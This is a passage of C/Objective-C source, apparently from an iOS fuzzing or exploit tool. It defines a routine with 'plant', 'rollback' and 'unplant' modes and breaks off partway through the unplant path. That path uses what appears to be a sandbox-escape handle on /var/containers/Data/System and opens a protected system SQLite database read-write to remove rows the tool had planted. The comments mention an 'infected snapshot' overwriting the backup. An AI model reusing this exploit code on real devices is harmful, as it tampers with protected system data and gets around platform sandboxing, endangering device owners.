static void p_bq35(void) {
    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
    const uint64_t F_DEF = 0x0000008000000000ULL;
    const char *mode = getenv("FUZZ_BQ35_MODE") ?: "plant";
    BOOL rollback = (strcmp(mode, "rollback") == 0);
    LOG("[bq35] v179 crash-oracle, MODE=%s", mode);

    // ---- UNPLANT: хирургическое удаление наших строк (LIKE-паттерн
    // '%FZ29%' — entityId начинается с "TimerEntity/", префиксный
    // 'FZ29%' не совпадает; бэкап НЕ используется — второй plant
    // перезаписал его заражённым снапшотом, см. §187).
    if (strcmp(mode, "unplant") == 0) {
        int64_t hu = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
        LOG("[bq35] CONTROL §170 point -> handle %lld%s", (long long)hu,
            hu < 0 ? "  *** NO ESCAPE — aborting ***" : "");
        fsync(fileno(stderr));
        if (hu < 0) { LOG("[bq35] done"); return; }
        NSString *dbp0 = @"/var/containers/Data/System/"
            "8EB68272-6502-49E9-B688-25CA4774CFE4/db";
        sqlite3 *db0 = NULL;
        if (sqlite3_open_v2(dbp0.UTF8String, &db0, SQLITE_OPEN_READWRITE,
